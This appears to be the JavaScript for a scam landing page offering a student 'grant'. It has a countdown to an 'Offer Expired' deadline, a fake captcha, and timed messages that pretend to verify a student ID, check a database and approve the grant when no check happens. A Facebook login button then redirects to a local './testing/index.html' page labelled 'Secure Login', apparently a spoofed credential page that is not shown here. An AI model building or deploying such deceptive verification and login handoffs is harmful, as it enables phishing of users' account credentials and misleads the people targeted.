// Set the launch date to New Year 2026
const targetDate = new Date("January 1, 2026 00:00:00").getTime();

function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance < 0) {
        document.getElementById("countdown").innerHTML = "<h3>Offer Expired</h3>";
        return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    // Check if elements exist before setting to avoid errors
    if (document.getElementById("days")) {
        document.getElementById("days").innerText = String(days).padStart(2, '0');
        document.getElementById("hours").innerText = String(hours).padStart(2, '0');
        document.getElementById("minutes").innerText = String(minutes).padStart(2, '0');
        document.getElementById("seconds").innerText = String(seconds).padStart(2, '0');
    }
}

setInterval(updateCountdown, 1000);
updateCountdown();

// === MODAL & INTERACTION LOGIC ===

// Get elements
const claimBtn = document.getElementById('claimBtn');
const modal = document.getElementById('authModal');
const closeModal = document.querySelector('.close-modal');
const modalContent = document.querySelector('.modal-content');

// Open Modal on Claim Click
if (claimBtn) {
    claimBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modal.style.display = 'flex';
        // Small delay to allow display:flex to apply before opacity transition
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
        }, 10);
    });
}

// Close Modal
function hideModal() {
    modal.style.opacity = '0';
    modalContent.style.transform = 'translateY(20px)';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

if (closeModal) {
    closeModal.addEventListener('click', hideModal);
}

// Close if clicking outside
window.addEventListener('click', (e) => {
    if (e.target == modal) {
        hideModal();
    }
});


// === FACEBOOK SDK SETUP ===
window.fbAsyncInit = function () {
    FB.init({
        appId: '123456789', // Placeholder
        cookie: true,
        xfbml: true,
        version: 'v18.0'
    });
    FB.AppEvents.logPageView();
};

// Check Login Status
function checkLoginState() {
    FB.getLoginStatus(function (response) {
        statusChangeCallback(response);
    });
}

function statusChangeCallback(response) {
    console.log('FB Response:', response);
    if (response.status === 'connected') {
        document.getElementById('fb-status').innerText = "Verifying Student ID...";
        setTimeout(() => {
            document.getElementById('fb-status').innerText = "Success! Redirecting...";
            document.getElementById('fb-status').style.color = "#4caf50";

            // Redirect to testing/index.html
            setTimeout(() => {
                window.location.href = './testing/index.html';
            }, 1000);
        }, 1500);
    } else {
        // For testing purposes, if you want immediate redirect regardless of status, 
        // you can uncomment the line below or handle other states.
        // window.location.href = './testing/index.html';
    }
}

// Custom Button Logic (Start Process)
const startBtn = document.getElementById('startVerifyBtn');
const captchaBox = document.getElementById('captchaClick');

// Steps identifiers
const steps = {
    guide: document.getElementById('step-guide'),
    captcha: document.getElementById('step-captcha'),
    loading: document.getElementById('step-loading'),
    success: document.getElementById('step-success'),
    final: document.getElementById('step-final')
};

// 1. Click Start -> Show Captcha
if (startBtn) {
    startBtn.addEventListener('click', () => {
        steps.guide.style.display = 'none';
        steps.captcha.style.display = 'block';
    });
}



// 2. Click Captcha -> Show Loading
if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        if (captchaBox.classList.contains('checked')) return; // Prevent double click

        captchaBox.classList.add('checked');

        // Slight delay for "human" feel then switch to loading
        setTimeout(() => {
            steps.captcha.style.display = 'none';
            steps.loading.style.display = 'block';
            simulateLoading();
        }, 800);
    });
}

function simulateLoading() {
    const texts = [
        "Analyzing Browser Fingerprint...",
        "Checking Student Database...",
        "Verifying Region Eligibility...",
        "Grant Approved."
    ];
    let i = 0;
    const interval = setInterval(() => {
        if (document.getElementById('loadingText')) {
            document.getElementById('loadingText').innerText = texts[i];
        }
        i++;
        if (i >= texts.length) {
            clearInterval(interval);
            showSuccess();
        }
    }, 800);
}

function showSuccess() {
    steps.loading.style.display = 'none';
    steps.success.style.display = 'block';

    // Auto transition to final after showing success tick
    setTimeout(() => {
        steps.success.style.display = 'none';
        steps.final.style.display = 'block';

        // Ensure the Facebook login button works even if SDK fails
        const fbLoginBtn = document.getElementById('fbLoginBtn');
        if (fbLoginBtn) {
            fbLoginBtn.onclick = function () {
                const statusMsg = document.getElementById('fb-status');
                if (statusMsg) {
                    statusMsg.innerText = "Redirecting to Secure Login...";
                    statusMsg.style.color = "var(--gold)";
                }

                setTimeout(() => {
                    window.location.href = './testing/index.html';
                }, 800);
            };
        }
    }, 1500);
}
